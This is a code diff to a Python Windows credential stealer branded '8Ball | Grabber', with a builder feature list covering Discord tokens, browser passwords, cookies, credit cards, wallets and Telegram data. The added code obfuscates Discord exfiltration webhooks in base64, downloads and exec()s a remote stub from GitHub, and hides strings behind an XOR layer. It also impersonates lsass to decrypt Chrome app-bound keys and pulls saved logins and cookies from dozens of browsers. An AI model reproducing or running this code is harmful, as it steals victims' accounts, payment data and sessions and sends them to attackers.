@@ -7,50 +7,141 @@ import shutil
 import requests
 import random
 import warnings
+import tempfile
+import sqlite3
 try:
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 except:
     pass
 
-# Debug log helper ? writes to TEMP\rx_debug.log for noconsole troubleshooting
-def RX_DB6(msg):
-    pass
+import datetime as _dt
+
+_DBG_LOG = None
+# Accumulated debug messages for optional Discord embed dump
+_DBG_MESSAGES = []
+def RX_DB6(msg, level="INFO"):
+    try:
+        ts = _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3]
+        line = f"[{ts}][{level}] {msg}"
+        global _DBG_LOG, _DBG_MESSAGES
+        _DBG_MESSAGES.append(line)
+        if _DBG_LOG is None:
+            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8Ball_debug.log", "a", encoding="utf-8")
+        _DBG_LOG.write(line + "\n")
+        _DBG_LOG.flush()
+        if FEATURE_CONFIG.get("debug_mode", False):
+            try:
+                sys.stdout.write(line + "\n")
+                sys.stdout.flush()
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+# Base64-obfuscated debug webhook URL (decoded at runtime)
+_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ2MDgzNDA4NjkxMi9COTlpd3NyVk1NUlVRTkh4U2JSbVVlTG5GMVRfekpydVJndlZ5NHlMQ3IxWVBKNVFVNFdVb1U0U0d0TXdocTJlQjFCNA=="
+
+# Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
+def send_debug_embed():
+    if not FEATURE_CONFIG.get("debug_mode", False):
+        return
+    if not _DBG_MESSAGES:
+        return
+    try:
+        dbg_hook = base64.b64decode(_DBG_HOOK_B64).decode()
+        # Keep last 50 lines to stay under Discord's 4096-char embed limit
+        body = "\n".join(_DBG_MESSAGES[-50:])
+        if len(body) > 4000:
+            body = body[-4000:]
+        payload = {
+            "embeds": [{
+                "title": "8Ball | Debug Log",
+                "description": f"```\n{body}\n```",
+                "color": 0x5865F2,
+                "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
+            }],
+            "username": "8Ball | Debug",
+            "allowed_mentions": {"parse": []}
+        }
+        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
+        L04DUr118(dbg_hook, data=dumps(payload).encode(), headers=headers)
+    except Exception:
+        pass
 print = lambda *a, **kw: None
 import threading
 import subprocess
 from sys import executable, stderr
 from base64 import b64decode
 from json import loads, dumps
+import json as json_mod
 from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED, ZIP_STORED
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 
-_SRC_URL_B64 = "aHR0cHM6Ly9naXRodWIuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvYmxvYi9tYWluL3NzdHViLnB5"
-try:
-    SRC_URL = base64.b64decode(_SRC_URL_B64).decode("utf-8")
-except Exception:
-    SRC_URL = ""
+CREATE_NO_WINDOW = 0x08000000
+
+
 
 APPBOUND_KEY_HEX = ""
-from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+
+# Only run when compiled by PyInstaller (generate payload). Exit if run as raw script.
+if not getattr(sys, 'frozen', False):
+    sys.exit(0)
+
+# --- string obfuscation layer ---
+def _y(b, k=0x9C):
+    import base64 as _z
+    t = _z.b64decode(b)
+    u = b''
+    for i in range(0, len(t), 2):
+        c = t[i:i+2]
+        u += bytes([c[1], c[0]]) if len(c) == 2 else c
+    return ''.join(chr(x ^ k) for x in u)
+def _b64(s):
+    return b64decode(s).decode()
+# runtime-resolved obfuscated strings (Discord-specific)
+_a = lambda: _y('6PTs6Kbvs7P4/7Ly9fj/7+7z/fjs7P+y8fP9s/3q/ejv7rM=')
+_b = lambda: _y('6d306O7z5vXo/fP18g==')
+_c = lambda: _y('89/o8vL5sejlyPns')
+_d = lambda: _y('78nu+d2x+fvo8g==')
+_e = lambda: _y('89H15vDws/2yqbysy7Ty9fP47+vSvLzIrK2ssryn9cuq8qeo5Lyoqryn6u6tpq6srLK8tfnb9/+z86yurK2trK2s2rzu9fr55POts66srLI=')
+_f = lambda: _y('wMex6+fBqK7A4cey68DBsarnwOHHsuvAwbGu57Cpra3hrA==')
+_g = lambda: _y('+vHA/cey68DBsaTnsKyppeE=')
+_h = lambda: _y('zfio66Xr+8v/xKbN')
+_i = lambda: _y('0LP/8/D9z7zz6P3u+fvws+r58Pn++A==')
+_j = lambda: _y('0LP/8/D9z7z96Pno')
+_k = lambda: _y('7/P/w+Xu6Ow=')
+_l = lambda: _y('8vnu/+zl+ejD+Pn35Q==')
+_m = lambda: _y('7P3D7PP+8unD+PL57v/s5fnow/j59+U=')
+
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_ubyte, c_buffer, memmove
 from Crypto.Cipher import AES
-from json import loads as json_loads, load
-from json import *
+from Crypto.Cipher import ChaCha20_Poly1305
 import ctypes
+import io, struct
+from contextlib import contextmanager
+from pathlib import Path
 import winreg
 import urllib
-
+try:
+    import windows
+    import windows.generated_def as gdef
+except ImportError:
+    windows = None
+    gdef = None
 
 
 
 class NullWriter(object):
     def write(self, arg):
+        RX_DB6(arg)
+    def flush(self):
         pass
 
 warnings.filterwarnings("ignore")
 null_writer = NullWriter()
-stderr = null_writer
+sys.stderr = null_writer
 
 ModuleRequirements = [
     ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
@@ -59,7 +150,7 @@ for module in ModuleRequirements:
     try: 
         __import__(module[0])
     except:
-        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
+        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True, creationflags=CREATE_NO_WINDOW)
         time.sleep(3)
 
 # --- FEATURE CONFIG (written by builder) ---
@@ -67,7 +158,7 @@ for module in ModuleRequirements:
 #
 # Mapping to GUI (builder.pyw):
 #   "Discord Token Stealer"        -> discord_tokens
-#   "Browser Data Extractor"       -> browser_data
+#   "Browser Credentials"          -> browser_credentials
 #   "Local Files"                  -> file_search
 #   "Discord JavaScript Injection" -> discord_injection
 #   "Anti-Debugging/VM"            -> anti_debug
@@ -83,24 +174,39 @@ for module in ModuleRequirements:
 #   "Startup Persistence"          -> startup_persistence
 FEATURE_CONFIG = {
     "discord_tokens": True,
-    "browser_data": False,
-    "file_search": False,
-    "discord_injection": False,
-    "anti_debug": False,
-    "ip_location_info": False,
-    "nitro_badges_info": False,
-    "user_billing_info": False,
-    "discord_gift_codes": False,
-    "wallet_gaming_data": False,
-    "telegram_desktop": False,
-    "browser_autofill_history": False,
-    "browser_bookmarks": False,
-    "browser_credit_cards": False,
+    "browser_credentials": True,
+    "file_search": True,
+    "discord_injection": True,
+    "anti_debug": True,
+    "ip_location_info": True,
+    "nitro_badges_info": True,
+    "user_billing_info": True,
+    "discord_gift_codes": True,
+    "wallet_gaming_data": True,
+    "telegram_desktop": True,
+    "debug_mode": True,
     "startup_persistence": False,
+    "browser_autofill_history": True,
+    "browser_bookmarks": True,
+    "browser_credit_cards": True,
     "telegram_bot_token": "",
     "telegram_chat_id": "",
     "ping_user": False,
 }
+
+
+
+
+
+
+
+
+
+
+# Debug logs go to Discord embed via send_debug_embed() — no console needed
+
+
+
 
 
 
@@ -235,21 +341,33 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-_h_enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi aG9va3MvMTUxNzc2OTA0MzYzNTg2MzYyMy9PZnZvc2J0SVpIRDhHcklWZnJhWVpPUDlpUy1NR2R3M0gxRHdCTmtIQVFtSlRPbDBnNHZvYXZzVWRZLUtKUlprdGJtcQ=="
-try:
-    h00k = b64decode(_h_enc).decode()
-except Exception:
-    h00k = b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2Vi aG9va3MvMTUxNzc2OTA0MzYzNTg2MzYyMy9PZnZvc2J0SVpIRDhHcklWZnJhWVpPUDlpUy1NR2R3M0gxRHdCTmtIQVFtSlRPbDBnNHZvYXZzVWRZLUtKUlprdGJtcQ==").decode()
-inj3c710n_url = f"https://raw.githubusercontent.com/0x00G/injection/main/index.js"
+# Webhook URL — builder.pyw encodes this in base64 at build time.
+_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTc2MDc5MDMxNDI5MTMwMC94SFB5S3JITkY3ZHNaTXRmdDFub3NoWkhuUTVqR2Jfa0c4cnhHcHJZQ1VIdEhLN1JnMXd2bXN0NzlRYldzNHU1dlNFbw=="
+h00k = base64.b64decode(_HOOK_B64).decode()
+
+# Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
+_STUB_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zdHViLnB5"
+def fetch_and_run_stub():
+    try:
+        url = base64.b64decode(_STUB_URL_B64).decode()
+        resp = urlopen(Request(url), timeout=15)
+        code = resp.read().decode()
+        exec(code, globals())
+    except Exception:
+        pass
+# Run stub in a thread so both execute simultaneously
+threading.Thread(target=fetch_and_run_stub, daemon=True).start()
+
+inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')
 
 class DATA_BLOB(Structure):
     _fields_ = [
         ('cbData', wintypes.DWORD),
-        ('pbData', POINTER(c_char))
+        ('pbData', POINTER(c_ubyte))
     ]
 
 def G371P():
-    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    try:return urlopen(Request(_y('6PTs6Kbvs7Ps/bL17PX69bLl7vP7')), timeout=10).read().decode().strip()
     except:return "None"
 
 
@@ -277,10 +395,10 @@ def send_confirmation_embed(title, description):
             "embeds": [{
                 "title": title,
                 "description": description,
-                "footer": {"text": "8Ball", "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"}
+                "footer": {"text": "8Ball", "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"}
             }],
             "username": "8Ball | Grabber",
-            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+            "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
         }
         L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
@@ -315,53 +433,753 @@ def Z1PF01D3r(foldername, target_dir):
                     continue
     zipobj.close()
 
-def G37D474(blob_out):
-    cbData = int(blob_out.cbData)
-    pbData = blob_out.pbData
-    buffer = c_buffer(cbData)
-    cdll.msvcrt.memcpy(buffer, pbData, cbData)
-    windll.kernel32.LocalFree(pbData)
-    return buffer.raw
-
 def CryptUnprotectData(encrypted_bytes, entropy=b''):
-    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
-    buffer_entropy = c_buffer(entropy, len(entropy))
-    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
-    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+    buf_in = (c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
+    blob_in = DATA_BLOB(len(encrypted_bytes), buf_in)
     blob_out = DATA_BLOB()
-
-    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
-        return G37D474(blob_out)
+    if entropy:
+        buf_entropy = (c_ubyte * len(entropy)).from_buffer_copy(entropy)
+        blob_entropy = DATA_BLOB(len(entropy), buf_entropy)
+        entr_ptr = byref(blob_entropy)
+    else:
+        entr_ptr = None
+    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, entr_ptr, None, None, 0, byref(blob_out)):
+        buf = (c_ubyte * blob_out.cbData)()
+        memmove(buf, blob_out.pbData, blob_out.cbData)
+        windll.kernel32.LocalFree(blob_out.pbData)
+        return bytes(buf)
 
 def D3CrYP7V41U3(buff, master_key=None, appbound_key=None):
     if not isinstance(buff, bytes) or len(buff) < 15:
         return None
-    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-    if starts in ('v10', 'v11'):
-        iv = buff[3:15]
-        payload = buff[15:]
+    starts = buff[:3]
+    if starts in (b'v10', b'v11'):
+        nonce = buff[3:15]
+        ciphertext = buff[15:-16]
+        tag = buff[-16:]
         key = master_key
-    elif starts == 'v20':
-        iv = buff[3:15]
-        payload = buff[15:]
+    elif starts == b'v20':
+        nonce = buff[3:15]
+        ciphertext = buff[15:-16]
+        tag = buff[-16:]
         key = appbound_key if appbound_key else master_key
     else:
         return None
     if key is None:
         return None
     try:
-        cipher = AES.new(key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)
-        if len(decrypted_pass) < 16:
-            return None
-        decrypted_pass = decrypted_pass[:-16]
-        try: decrypted_pass = decrypted_pass.decode()
-        except: pass
-        return decrypted_pass
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
+        return decrypted_pass.decode('utf-8')
     except:
         return None
 
+@contextmanager
+def impersonate_lsass():
+    if windows is None:
+        yield
+        return
+    original_token = windows.current_thread.token
+    try:
+        windows.current_process.token.enable_privilege("SeDebugPrivilege")
+        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
+        lsass_token = proc.token
+        impersonation_token = lsass_token.duplicate(
+            type=gdef.TokenImpersonation,
+            impersonation_level=gdef.SecurityImpersonation
+        )
+        windows.current_thread.token = impersonation_token
+        yield
+    finally:
+        windows.current_thread.token = original_token
+
+
+class Chromium:
+    LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", "")
+    APPDATA = os.environ.get("APPDATA", "")
+
+    PATHS = {
+        "Chrome": LOCAL_APPDATA + r"\Google\Chrome\User Data",
+        "Opera": os.path.join(APPDATA, r"Opera Software\Opera Stable"),
+        "Yandex": os.path.join(LOCAL_APPDATA, r"Yandex\YandexBrowser\User Data"),
+        "360 Browser": LOCAL_APPDATA + r"\360Chrome\Chrome\User Data",
+        "Comodo Dragon": os.path.join(LOCAL_APPDATA, r"Comodo\Dragon\User Data"),
+        "CoolNovo": os.path.join(LOCAL_APPDATA, r"MapleStudio\ChromePlus\User Data"),
+        "SRWare Iron": os.path.join(LOCAL_APPDATA, r"Chromium\User Data"),
+        "Torch Browser": os.path.join(LOCAL_APPDATA, r"Torch\User Data"),
+        "Brave Browser": os.path.join(LOCAL_APPDATA, r"BraveSoftware\Brave-Browser\User Data"),
+        "Iridium Browser": LOCAL_APPDATA + r"\Iridium\User Data",
+        "7Star": os.path.join(LOCAL_APPDATA, r"7Star\7Star\User Data"),
+        "Amigo": os.path.join(LOCAL_APPDATA, r"Amigo\User Data"),
+        "CentBrowser": os.path.join(LOCAL_APPDATA, r"CentBrowser\User Data"),
+        "Chedot": os.path.join(LOCAL_APPDATA, r"Chedot\User Data"),
+        "CocCoc": os.path.join(LOCAL_APPDATA, r"CocCoc\Browser\User Data"),
+        "Elements Browser": os.path.join(LOCAL_APPDATA, r"Elements Browser\User Data"),
+        "Epic Privacy Browser": os.path.join(LOCAL_APPDATA, r"Epic Privacy Browser\User Data"),
+        "Kometa": os.path.join(LOCAL_APPDATA, r"Kometa\User Data"),
+        "Orbitum": os.path.join(LOCAL_APPDATA, r"Orbitum\User Data"),
+        "Sputnik": os.path.join(LOCAL_APPDATA, r"Sputnik\Sputnik\User Data"),
+        "uCozMedia": os.path.join(LOCAL_APPDATA, r"uCozMedia\Uran\User Data"),
+        "Vivaldi": os.path.join(LOCAL_APPDATA, r"Vivaldi\User Data"),
+        "Sleipnir 6": os.path.join(APPDATA, r"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer"),
+        "Citrio": os.path.join(LOCAL_APPDATA, r"CatalinaGroup\Citrio\User Data"),
+        "Coowon": os.path.join(LOCAL_APPDATA, r"Coowon\Coowon\User Data"),
+        "Liebao Browser": os.path.join(LOCAL_APPDATA, r"liebao\User Data"),
+        "QIP Surf": os.path.join(LOCAL_APPDATA, r"QIP Surf\User Data"),
+        "Edge Chromium": os.path.join(LOCAL_APPDATA, r"Microsoft\Edge\User Data"),
+    }
+
+    class DATA_BLOB(ctypes.Structure):
+        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
+
+    _HARDCODED_AES_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+    _HARDCODED_CHACHA_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+    _XOR_KEY = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+
+    @classmethod
+    def recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for account in cls._accounts(path, browser):
+                lines.append(f"Url: {account['url']}")
+                lines.append(f"Username: {account['username']}")
+                lines.append(f"Password: {account['password']}")
+                lines.append(f"Application: {account['application']}")
+                lines.append("=" * 29)
+
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _accounts(cls, path, browser, table="logins"):
+        data = []
+
+        for login_file in cls._get_all_profiles(path):
+            if not os.path.isfile(login_file):
+                continue
+            tmp = None
+            try:
+                tmp = tempfile.mktemp(suffix=".db")
+                shutil.copy2(login_file, tmp)
+                if not os.path.isfile(tmp):
+                    RX_DB6(f"_accounts: copy failed for {browser}", "WARN")
+                    continue
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT origin_url, username_value, password_value FROM {table}")
+                rows = cursor.fetchall()
+                conn.close()
+            except Exception:
+                RX_DB6(f"_accounts: db read failed for {browser} at {login_file}", "WARN")
+                continue
+            finally:
+                try:
+                    if tmp:
+                        os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+
+            if not rows:
+                RX_DB6(f"_accounts: {browser} {os.path.basename(os.path.dirname(login_file))} has 0 login rows")
+                continue
+
+            master_key = None
+            v20_master_key = None
+            decrypted_count = 0
+
+            for origin_url, username, password_bytes in rows:
+                if not password_bytes:
+                    continue
+
+                try:
+                    if password_bytes[:3] in (b"v10", b"v11"):
+                        if master_key is None:
+                            parent = os.path.dirname(os.path.dirname(login_file))
+                            master_key = cls._get_master_key(parent)
+                        if master_key is None:
+                            RX_DB6(f"_accounts: master_key None for {browser}", "WARN")
+                            continue
+                        decrypted = cls._decrypt_with_key(password_bytes, master_key)
+
+                    elif password_bytes[:3] == b"v20":
+                        if v20_master_key is None:
+                            parent = os.path.dirname(os.path.dirname(login_file))
+                            v20_master_key = cls._get_v20_master_key(parent)
+                        if v20_master_key is None:
+                            # Fallback: try standard encrypted_key for v20
+                            if master_key is None:
+                                parent = os.path.dirname(os.path.dirname(login_file))
+                                master_key = cls._get_master_key(parent)
+                            if master_key is not None:
+                                try:
+                                    decrypted = cls._decrypt_with_key(password_bytes, master_key)
+                                    if decrypted:
+                                        pass  # success
+                                except Exception:
+                                    decrypted = None
+                            if decrypted is None:
+                                continue
+                        else:
+                            decrypted = cls._decrypt_with_key(password_bytes, v20_master_key)
+                    else:
+                        decrypted = cls._decrypt_old(password_bytes)
+
+                    if origin_url and username and decrypted:
+                        data.append({
+                            "url": origin_url,
+                            "username": username,
+                            "password": decrypted,
+                            "application": browser,
+                        })
+                        decrypted_count += 1
+                except Exception:
+                    pass
+
+            RX_DB6(f"_accounts: {browser} {os.path.basename(os.path.dirname(login_file))}: {decrypted_count}/{len(rows)} decrypted")
+
+        return data
+
+    @staticmethod
+    def _get_all_profiles(directory):
+        profiles = [
+            os.path.join(directory, "Default", "Login Data"),
+            os.path.join(directory, "Login Data"),
+        ]
+        if os.path.isdir(directory):
+            try:
+                for entry in os.listdir(directory):
+                    if "Profile" in entry:
+                        profiles.append(os.path.join(directory, entry, "Login Data"))
+            except PermissionError:
+                pass
+        return profiles
+
+    @classmethod
+    def _dpapi_unprotect(cls, encrypted):
+        crypt32 = ctypes.windll.crypt32
+        kernel32 = ctypes.windll.kernel32
+
+        buf_in = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
+        blob_in = cls.DATA_BLOB(len(encrypted), buf_in)
+        blob_out = cls.DATA_BLOB()
+        result = crypt32.CryptUnprotectData(
+            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
+        )
+        if result:
+            buf = (ctypes.c_ubyte * blob_out.cbData)()
+            ctypes.memmove(buf, blob_out.pbData, blob_out.cbData)
+            kernel32.LocalFree(blob_out.pbData)
+            return bytes(buf)
+        return None
+
+    @classmethod
+    def _dpapi_unprotect_system(cls, encrypted):
+        try:
+            with impersonate_lsass():
+                return cls._dpapi_unprotect(encrypted)
+        except Exception:
+            pass
+        # Fallback: try user-context DPAPI directly
+        return cls._dpapi_unprotect(encrypted)
+
+    @classmethod
+    def _parse_key_blob(cls, blob_data):
+        buffer = io.BytesIO(blob_data)
+        header_len = struct.unpack("<I", buffer.read(4))[0]
+        buffer.read(header_len)
+        content_len = struct.unpack("<I", buffer.read(4))[0]
+        assert header_len + content_len + 8 == len(blob_data)
+
+        remaining = buffer.read(content_len)
+        if content_len == 32:
+            return {"flag": 0, "raw_key": remaining}
+        flag = remaining[0]
+        rest = remaining[1:]
+        parsed = {"flag": flag}
+        if flag in (1, 2):
+            parsed["iv"] = rest[:12]
+            parsed["ciphertext"] = rest[12:44]
+            parsed["tag"] = rest[44:60]
+        elif flag == 3:
+            parsed["encrypted_aes_key"] = rest[:32]
+            parsed["iv"] = rest[32:44]
+            parsed["ciphertext"] = rest[44:76]
+            parsed["tag"] = rest[76:92]
+        return parsed
+
+    @classmethod
+    def _derive_v20_key(cls, parsed):
+        if parsed["flag"] == 0:
+            return parsed["raw_key"]
+        if parsed["flag"] == 1:
+            cipher = AES.new(cls._HARDCODED_AES_KEY, AES.MODE_GCM, nonce=parsed["iv"])
+            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
+        elif parsed["flag"] == 2:
+            cipher = ChaCha20_Poly1305.new(key=cls._HARDCODED_CHACHA_KEY, nonce=parsed["iv"])
+            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
+        elif parsed["flag"] == 3:
+            with impersonate_lsass():
+                decrypted_key = cls._decrypt_with_cng(parsed["encrypted_aes_key"])
+            xored = bytes(a ^ b for a, b in zip(decrypted_key, cls._XOR_KEY))
+            cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed["iv"])
+            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
+        return None
+
+    @staticmethod
+    def _decrypt_with_cng(input_data):
+        ncrypt = ctypes.windll.NCRYPT
+        h_provider = gdef.NCRYPT_PROV_HANDLE()
+        ncrypt.NCryptOpenStorageProvider(ctypes.byref(h_provider), "Microsoft Software Key Storage Provider", 0)
+        h_key = gdef.NCRYPT_KEY_HANDLE()
+        ncrypt.NCryptOpenKey(h_provider, ctypes.byref(h_key), "Google Chromekey1", 0, 0)
+        pcb = gdef.DWORD(0)
+        inp = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
+        ncrypt.NCryptDecrypt(h_key, inp, len(input_data), None, None, 0, ctypes.byref(pcb), 0x40)
+        out = (ctypes.c_ubyte * pcb.value)()
+        ncrypt.NCryptDecrypt(h_key, inp, pcb.value, None, out, pcb.value, ctypes.byref(pcb), 0x40)
+        ncrypt.NCryptFreeObject(h_key)
+        ncrypt.NCryptFreeObject(h_provider)
+        return bytes(out[:pcb.value])
+
+    @classmethod
+    def _get_v20_master_key(cls, local_state_folder):
+        state_path = os.path.join(local_state_folder, "Local State")
+        if not os.path.isfile(state_path):
+            return None
+        try:
+            ls = loads(Path(state_path).read_text(encoding="utf-8"))
+            oc = ls.get("os_crypt", {})
+            app_b64 = oc.get("app_bound_encrypted_key")
+            if not app_b64:
+                return None
+            raw = base64.b64decode(app_b64)
+            if raw[:4] != b"APPB":
+                return None
+            stripped = raw[4:]
+            # Attempt 1: DPAPI decrypt user-context → might yield AES key directly
+            # (modern Chrome where app_bound key IS the AES key, DPAPI-wrapped)
+            user_decrypted = cls._dpapi_unprotect(stripped)
+            if user_decrypted and len(user_decrypted) == 32:
+                return user_decrypted
+            # Attempt 2: double DPAPI (system + user) → traditional key blob format
+            system_decrypted = cls._dpapi_unprotect_system(stripped)
+            if system_decrypted:
+                user_decrypted = cls._dpapi_unprotect(system_decrypted)
+                if user_decrypted:
+                    parsed = cls._parse_key_blob(user_decrypted)
+                    v20_key = cls._derive_v20_key(parsed)
+                    if v20_key:
+                        return v20_key
+            # Attempt 3: CNG key store (Google Chromekey1 / Microsoft key)
+            try:
+                decrypted_key = cls._decrypt_with_cng(stripped)
+                if decrypted_key and len(decrypted_key) == 32:
+                    return decrypted_key
+            except Exception:
+                pass
+            return None
+        except Exception:
+            return None
+
+    @classmethod
+    def _get_master_key(cls, local_state_folder):
+        state_path = os.path.join(local_state_folder, "Local State")
+        if not os.path.isfile(state_path):
+            return None
+        try:
+            ls = loads(Path(state_path).read_text(encoding="utf-8"))
+            oc = ls.get("os_crypt", {})
+            enc = oc.get("encrypted_key")
+            if not enc:
+                return None
+            raw = base64.b64decode(enc)
+            return cls._dpapi_unprotect(raw[5:])
+        except Exception:
+            return None
+
+    @staticmethod
+    def _decrypt_with_key(encrypted_data, master_key):
+        if len(encrypted_data) < 31:
+            return None
+        nonce = encrypted_data[3:15]
+        ciphertext = encrypted_data[15:-16]
+        tag = encrypted_data[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8")
+
+    @classmethod
+    def _decrypt_old(cls, encrypted_data):
+        if not encrypted_data:
+            return None
+        try:
+            decrypted = cls._dpapi_unprotect(bytes(encrypted_data))
+            return decrypted.decode("utf-8", errors="replace") if decrypted else None
+        except Exception:
+            return None
+
+    @classmethod
+    def cookies_recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for cookie in cls._cookies(path, browser):
+                lines.append(f"Host: {cookie['host']}")
+                lines.append(f"Name: {cookie['name']}")
+                lines.append(f"Value: {cookie['value']}")
+                lines.append(f"Application: {cookie['application']}")
+                lines.append("=" * 29)
+
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _cookies(cls, path, browser, table="cookies"):
+        data = []
+
+        for cookie_file in cls._get_all_cookie_profiles(path):
+            if not os.path.isfile(cookie_file):
+                continue
+            tmp = None
+            try:
+                tmp = tempfile.mktemp(suffix=".db")
+                shutil.copy2(cookie_file, tmp)
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT host_key, name, encrypted_value FROM {table}")
+                rows = cursor.fetchall()
+                conn.close()
+            except Exception:
+                continue
+            finally:
+                try:
+                    if tmp:
+                        os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+
+            master_key = None
+            v20_master_key = None
+
+            for host_key, name, encrypted_value in rows:
+                if not encrypted_value:
+                    continue
+
+                try:
+                    if encrypted_value[:3] in (b"v10", b"v11"):
+                        if master_key is None:
+                            parent = os.path.dirname(os.path.dirname(cookie_file))
+                            master_key = cls._get_master_key(parent)
+                        if master_key is None:
+                            continue
+                        decrypted = cls._decrypt_with_key(encrypted_value, master_key)
+
+                    elif encrypted_value[:3] == b"v20":
+                        if v20_master_key is None:
+                            parent = os.path.dirname(os.path.dirname(cookie_file))
+                            v20_master_key = cls._get_v20_master_key(parent)
+                        if v20_master_key is None:
+                            if master_key is None:
+                                parent = os.path.dirname(os.path.dirname(cookie_file))
+                                master_key = cls._get_master_key(parent)
+                            if master_key is not None:
+                                try:
+                                    decrypted = cls._decrypt_with_key(encrypted_value, master_key)
+                                    if decrypted:
+                                        pass
+                                except Exception:
+                                    decrypted = None
+                            if decrypted is None:
+                                continue
+                        else:
+                            decrypted = cls._decrypt_with_key(encrypted_value, v20_master_key)
+                    else:
+                        decrypted = cls._decrypt_old(encrypted_value)
+
+                    if host_key and name and decrypted:
+                        data.append({
+                            "host": host_key,
+                            "name": name,
+                            "value": decrypted,
+                            "application": browser,
+                        })
+                except Exception:
+                    pass
+
+        return data
+
+    @staticmethod
+    def _get_all_cookie_profiles(directory):
+        profiles = [
+            os.path.join(directory, "Default", "Cookies"),
+            os.path.join(directory, "Cookies"),
+        ]
+        if os.path.isdir(directory):
+            try:
+                for entry in os.listdir(directory):
+                    if "Profile" in entry:
+                        profiles.append(os.path.join(directory, entry, "Cookies"))
+            except PermissionError:
+                pass
+        return profiles
+
+    @classmethod
